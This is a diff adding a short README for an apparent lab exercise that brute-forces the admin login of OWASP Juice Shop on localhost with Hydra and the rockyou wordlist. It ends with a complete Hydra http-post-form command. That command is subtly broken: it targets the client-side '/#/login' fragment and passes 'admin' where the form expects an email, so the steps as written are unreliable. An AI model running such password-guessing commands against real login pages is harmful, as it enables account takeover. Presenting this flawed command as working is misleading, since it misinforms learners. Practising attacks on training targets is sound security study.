@@ -1,0 +1,19 @@
+Brute Force on Admin Credentials using Hydra
+Overview
+This repository contains a demonstration of a brute-force attack on the OWASP Juice Shop admin login page using Hydra.
+
+Objective
+Perform a brute-force attack to identify valid admin credentials by automating login attempts with Hydra.
+
+Tools Used
+Hydra
+Wordlist: /usr/share/wordlists/rockyou.txt
+Steps to Perform Brute Force Attack
+Identify Login Form Parameters:
+Access the OWASP Juice Shop login page at localhost:3000/#/login and inspect the login form. The parameters for email and password are:
+Email field name: email
+Password field name: password
+Error message on failed login: Invalid email or password.
+Craft the Hydra Command:
+Run the following command in your terminal:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/#/login:email=^USER^&password=^PASS^:Invalid email or password."
